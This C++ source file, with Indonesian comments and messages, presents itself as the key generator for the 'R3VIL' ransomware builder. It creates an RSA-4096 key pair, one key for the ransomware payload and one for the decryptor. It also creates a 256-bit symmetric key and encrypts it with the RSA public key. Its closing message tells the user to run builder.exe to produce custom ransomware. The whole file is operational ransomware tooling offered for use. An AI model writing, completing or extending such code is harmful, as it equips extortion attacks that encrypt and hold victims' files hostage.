// generate.cpp - R3VIL Ransomware Key Generator for Custom Builder
#include <cryptopp/cryptlib.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/files.h>
#include <cryptopp/filters.h>
#include <cryptopp/pkcspad.h>
#include <cryptopp/hex.h>

#include <iostream>
#include <string>
#include <filesystem>

using namespace CryptoPP;
namespace fs = std::filesystem;

int main() {
    std::cout << "\n========================================\n";
    std::cout << "     R3VIL Ransomware Key Generator     \n";
    std::cout << "========================================\n\n";

    AutoSeededRandomPool rng;

    std::cout << "[*] Generating RSA-4096 key pair...\n";

    // Generate RSA Private Key (4096 bit)
    RSA::PrivateKey privateKey;
    privateKey.GenerateRandomWithKeySize(rng, 4096);

    RSA::PublicKey publicKey(privateKey);

    // Simpan RSA Public Key
    FileSink pubFile("Public/rsa_public.der", true);
    publicKey.Save(pubFile);
    pubFile.MessageEnd();

    // Simpan RSA Private Key
    FileSink privFile("Private/rsa_private.der", true);
    privateKey.Save(privFile);
    privFile.MessageEnd();

    std::cout << "[✓] RSA Key Pair generated successfully!\n";
    std::cout << "    → rsa_public.der   (untuk ransomware)\n";
    std::cout << "    → rsa_private.der  (untuk decryptor)\n\n";

    // Generate Symmetric Key (32-byte)
    SecByteBlock symmetricKey(32);
    rng.GenerateBlock(symmetricKey, symmetricKey.size());

    // Encrypt symmetric key dengan RSA Public Key
    RSAES_OAEP_SHA_Encryptor encryptor(publicKey);

    std::string encryptedKey;
    StringSource ss(symmetricKey, symmetricKey.size(), true,
        new PK_EncryptorFilter(rng, encryptor, new StringSink(encryptedKey))
    );

    // Simpan encrypted symmetric key
    FileSink keyFile("aes_key.enc", true);
    keyFile.Put(reinterpret_cast<const byte*>(encryptedKey.data()), encryptedKey.size());
    keyFile.MessageEnd();

    std::cout << "[✓] Symmetric key (32-byte) generated and encrypted with RSA\n";
    std::cout << "    → aes_key.enc\n\n";

    std::cout << "========================================\n";
    std::cout << "               SUMMARY                  \n";
    std::cout << "========================================\n";
    std::cout << "RSA Key Size       : 4096 bit\n";
    std::cout << "Symmetric Key      : 256-bit (32 bytes)\n";
    std::cout << "Encryption Scheme  : RSA-OAEP-SHA\n";
    std::cout << "File Encryption    : XChaCha20Poly1305 / AES-256-CBC (pilih di builder)\n";
    std::cout << "Custom Extension   : Diatur di builder\n";
    std::cout << "========================================\n\n";

    std::cout << "[!] Simpan file-file berikut dengan aman:\n";
    std::cout << "    • rsa_private.der  ← JANGAN hilang! (untuk decrypt)\n";
    std::cout << "    • rsa_public.der   ← Untuk ransomware\n";
    std::cout << "    • aes_key.enc      ← Hasil enkripsi symmetric key\n\n";

    std::cout << "Key generation completed successfully!\n";
    std::cout << "Sekarang jalankan builder.exe untuk membuat ransomware custom.\n";

    return 0;
}
